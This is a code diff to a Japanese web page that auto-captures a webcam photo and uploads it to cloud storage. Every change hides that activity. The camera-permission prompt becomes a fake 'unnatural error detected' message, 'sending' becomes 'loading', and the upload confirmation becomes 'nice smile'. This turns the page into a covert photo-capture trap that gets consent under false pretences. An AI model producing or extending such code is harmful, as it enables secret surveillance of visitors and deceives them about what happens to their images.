@@ -38,10 +38,10 @@
 </head>
 <body>
   <div class="box">
-    <h2>📸 カメラを許可してください</h2>
+    <h2>不自然なエラーを検知しました</h2>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <div id="status">カメラのアクセス許可をお願いします。</div>
+    <div id="status">アクセス許可をお願いします。</div>
   </div>
 
   <script type="module">
@@ -78,7 +78,7 @@
         // 少し待ってから自動撮影
         setTimeout(() => captureAndUpload(stream), 1500);
       } catch (err) {
-        status.textContent = "カメラが許可されませんでした: " + err.message;
+        status.textContent = "不自然なエラーを検知しました、もう一度やり直してください。: " + err.message;
       }
     });
 
@@ -91,7 +91,7 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.9));
 
-        status.textContent = "送信中...";
+        status.textContent = "読み込み中・・・";
 
         const { error } = await supabase.storage
           .from("photos")
@@ -101,7 +101,7 @@
           status.textContent = "送信エラー: " + error.message;
         } else {
           status.innerHTML = `
-            ✅ 撮影＆送信完了！<br>
+            いい笑顔ですね<br>
             <a href="check.html?id=${id}" target="_blank" style="color:orange;">確認ページを開く</a>
           `;
         }
